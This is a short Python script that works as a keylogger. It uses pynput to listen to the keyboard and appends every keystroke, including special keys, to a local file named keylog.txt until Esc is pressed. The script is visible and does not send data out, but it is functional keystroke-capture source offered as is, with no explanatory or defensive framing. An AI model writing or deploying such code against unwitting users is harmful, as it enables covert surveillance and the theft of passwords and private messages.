from pynput.keyboard import Key, Listener


log_file = "keylog.txt"

def on_press(key):
  with open(log_file, "a") as log:
    try:
        log.write(f"{key.char}")
    except AttributeError:
        if key == Key.space:
            log.write(" ")
        elif key == Key.enter:
            log.write("\n")
        elif key == Key.tab:
            log.write("\t")
        else:
            log.write(f" [{key}] ")

def on_release(key):

  if key == Key.esc:
    return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press 'Esc' to stop.")
    listener.join()